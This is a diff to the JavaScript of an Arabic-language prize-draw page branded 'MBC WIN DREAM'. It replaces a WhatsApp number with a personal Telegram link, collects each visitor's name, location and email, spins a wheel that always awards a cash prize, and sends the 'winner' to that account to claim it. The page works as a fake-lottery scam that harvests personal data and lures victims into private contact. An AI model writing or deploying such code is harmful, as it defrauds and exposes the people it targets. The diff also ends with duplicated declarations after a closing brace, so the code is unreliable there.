@@ -1,6 +1,6 @@
 // --- 0. CRITICAL SETUP VARIABLES ---
-const YOUR_WHATSAPP_NUMBER = "+13215054515"; 
-const WHATSAPP_MESSAGE =
+const YOUR_TELEGRAM_LINK = "https://t.me/mustafaalaghambcdream24"; 
+const TELEGRAM_MESSAGE =
     "مرحباً! لقد فزت بجائزة في سحب MBC WIN DREAM. هذه بياناتي لاستلام الجائزة:"; 
 
 // --- PRIZE TIERS (MONEY ONLY) ---
@@ -31,10 +31,91 @@ const step4Reward = document.getElementById('step-4-reward');
 
 const resultMessage = document.getElementById('result-message');
 const prizeWonElement = document.getElementById('prize-won');
-const whatsappLink = document.getElementById('whatsapp-link');
+const telegramLink = document.getElementById('whatsapp-link'); // Update this ID in your HTML too
 
 // --- GLOBAL VARIABLES ---
 let userData = {};
+let winningPrize = null;
+let selectedDream = "";
+
+
+// --- 2. STEP 1: DREAM SELECTION ---
+function startChallenge(event) {
+    selectedDream = event.currentTarget.getAttribute("data-dream");
+
+    step1Welcome.style.display = "none";
+    step2Form.style.display = "block";
+}
+
+dreamButtons.forEach(button => {
+    button.addEventListener("click", startChallenge);
+});
+
+
+// --- 3. STEP 2: FORM SUBMISSION ---
+function handleFormSubmit(event) {
+    event.preventDefault();
+
+    userData.name = document.getElementById("name").value.trim();
+    userData.location = document.getElementById("location").value.trim();
+    userData.email = document.getElementById("email").value.trim();
+
+    if (!userData.name || !userData.location || !userData.email) {
+        alert("يرجى إدخال جميع البيانات قبل المتابعة.");
+        return;
+    }
+
+    step2Form.style.display = "none";
+    step3Spin.style.display = "block";
+    resultMessage.textContent = 'اضغط على زر «دوّر الآن» عندما تكون جاهزاً.';
+}
+
+detailsForm.addEventListener("submit", handleFormSubmit);
+
+
+// --- 4. STEP 3: SPIN LOGIC ---
+function spinWheel() {
+    spinBtn.disabled = true;
+    spinBtn.textContent = "...جاري التدوير...";
+    resultMessage.textContent = "يتم الآن تحديد جائزتك، يرجى الانتظار...";
+
+    setTimeout(() => {
+        const randomIndex = Math.floor(Math.random() * prizes.length);
+        winningPrize = prizes[randomIndex];
+
+        resultMessage.textContent =
+            `تهانينا! لقد ربحت ${winningPrize.name}.`;
+
+        setTimeout(() => {
+            handleRewardTransition();
+        }, 1500);
+
+    }, 3000);
+}
+
+spinBtn.addEventListener("click", spinWheel);
+
+
+// --- 5. STEP 4: SHOW REWARD + TELEGRAM ---
+function handleRewardTransition() {
+    step3Spin.style.display = "none";
+    step4Reward.style.display = "block";
+
+    prizeWonElement.textContent = `🎉 ${winningPrize.name}`;
+
+    const telegramText =
+        `${TELEGRAM_MESSAGE}\n\n` +
+        `الجائزة: ${winningPrize.name}\n` +
+        `الحلم المختار: ${selectedDream}\n` +
+        `الاسم: ${userData.name}\n` +
+        `الموقع: ${userData.location}\n` +
+        `البريد الإلكتروني: ${userData.email}`;
+
+    // Telegram links don't support pre-filled text like WhatsApp,
+    // so we link directly to your Telegram account.
+    telegramLink.href = YOUR_TELEGRAM_LINK;
+    telegramLink.setAttribute("title", telegramText); // Store message as tooltip for reference
+}let userData = {};
 let winningPrize = null;
 let selectedDream = "";
 
